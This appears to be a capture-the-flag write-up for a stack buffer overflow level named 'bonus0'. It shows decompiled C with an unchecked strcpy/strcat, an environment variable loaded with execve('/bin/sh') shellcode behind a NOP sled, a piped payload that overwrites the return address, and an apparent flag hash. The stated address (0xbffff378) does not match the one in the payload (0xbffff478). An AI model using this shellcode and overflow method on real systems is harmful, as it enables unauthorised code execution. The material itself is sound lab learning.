```C
#include <stdlib.h>
#include <string.h>

char	*p(char *s, char *str)                 
{
    /*
        Read max 4096 bytes and puts it in buffer.
        Replace the first '\n' by '\0'.
        Copy 20 first bytes from buffer to s.
    */
	char	buffer[4096];

	puts(str);
	read(0, buffer, 4096);
	*strchr(buffer, '\n') = 0;
	return (strncpy(s, buffer, 20));
}

char	*pp(char *buffer)
{
    /*
        Call p() twice.
        Copy first input a to buffer without limit check
        Puts a ' \0' at the end of the buffer.
        Add input b at the end of buffer.
    */
	char			b[20];
	char			a[20];
	unsigned int	len;

	p(a, " - ");
	p(b, " - ");
	strcpy(buffer, a);

	len = strlen(buffer);

	buffer[len] = ' ';
	buffer[len + 1] = 0;
	return (strcat(buffer, b));
}

int		main(void)
{
	char	buffer[42]; 

	pp(buffer);
	puts(buffer);
	return (0);
}
```

- let's add a env variable with our shellcode in it because input 2 looks a bit too small

```bash
export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
```


- We know want to fill first input in order to avoid the program to insert a '\0' in our input. (Put a \n just after to send the first input and get to second one right after)

- The second input will write 9 bytes of padding until getting to EIP register.
- We will now write the address of our env variable with the shellcode.
- We will then fill the second buffer with 7 bytes.

```bash
payload = (python -c "print '\x90' * 4095 + '\n' + '\x90' * 9 + '\xbf\xff\xf4\x78'[::-1] + '\x90' * 10"; cat) | ./bonus0

With 0xbffff378 the address of the SHELLCODE env variable found with getenv() in C.

cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
